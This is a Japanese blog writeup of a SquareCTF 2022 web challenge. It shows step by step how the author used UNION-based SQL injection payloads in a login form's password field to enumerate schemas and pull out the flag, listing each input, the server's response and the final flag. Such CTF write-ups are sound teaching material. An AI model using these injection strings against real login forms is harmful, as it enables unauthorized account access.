---
title: "SquaareCTF 2022 Writeup"
date: 2022-11-20T15:00:00+09:00
lastmod: 2022-11-20T15:00:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">

{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fsquarectf_2022%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://2022.squarectf.com/challenges](https://2022.squarectf.com/challenges)
<br /><br />

（最近、ちょくちょくCTFイベントに参加しているんですが、全然解けない事が多いです。。。全体的に難易度あがってません？？）

<br>
えーっと、50点のチャレンジ2つと、Sanity Checkを1問解いただけです。

101点を獲得し、最終順位は250位でした。<br />

<img src="https://captureamerica.github.io/writeups/img/squarectf_2022_score.png" alt="squarectf_2022_score.png">

<br><br>

とりあえず、記念に一個だけ、writeupを残しておきます。



<br /><br />
<br /><br />
## [Web]: Alex Hanlon Has The Flag! (50 points)
- - -
### Challenge
> Alex Hanlon has saved the flag in his account! See if you can figure out his username and then login as him. But just know that it will be impossible to brute force his password.
<br /><br />
[http://chals.2022.squarectf.com:4102](http://chals.2022.squarectf.com:4102)

<br>

### Solution
UsernameとPasswordが入力できるログインフォームが表示されます。

<br />
Usernameに`alex`、PasswordにテキトーなSQLiのパターンを入れたときに、
<pre>
Sorry, admin is the wrong user
</pre>
というエラーが返ります。`admin`なんて入力してないのに。。

<br />

実は、次に出てくるチャレンジ「Going In Blind」のDescriptionに、`Ok, the developers got smart, and figured out a way to prevent SQLi in the login page. Plus, they decided the flag shouldn't be hardcoded in the web application anymore. ` という記載があって、それもヒントになってますね。

おそらく、内部的に以下のようになっているっぽいです。
<pre>
SELECT * FROM user WHERE username = 'admin' and PASSWORD = '$password'
</pre>

<br /><br />
ここからはトライ＆エラーです。

入力値：
<pre>
' union select 1, schema_name, 3 from information_schema.schemata;-- -
</pre>

結果：
<pre>
java.sql.SQLException: The used SELECT statements have a different number of columns
</pre>

<br /><br />

入力値：
<pre>
' union select schema_name from information_schema.schemata;-- -
</pre>

結果：
<pre>
Sorry, information_schema is the wrong user
</pre>

<br /><br />


入力値：（テーブル名とカラム名は完全なGuessです）
<pre>
' union select username from user where id = 1;-- -
</pre>

結果：
<pre>
java.sql.SQLSyntaxErrorException: Unknown column 'id' in 'where clause'
</pre>

<br /><br />



入力値：
<pre>
' union select username from user where username like 'al%';-- -
</pre>

結果：
<pre>
Nope, try again!
</pre>

<br /><br />


入力値：
<pre>
' union select username from user where username <> 'admin';-- -
</pre>

結果：
<pre>
flag{470bbbc0519e4bc6987bb00bef24a97a}
</pre>

<br /><br />



Flag: `flag{470bbbc0519e4bc6987bb00bef24a97a}`


<br /><br />
<br /><br />
- - -
<br /><br />
<br /><br />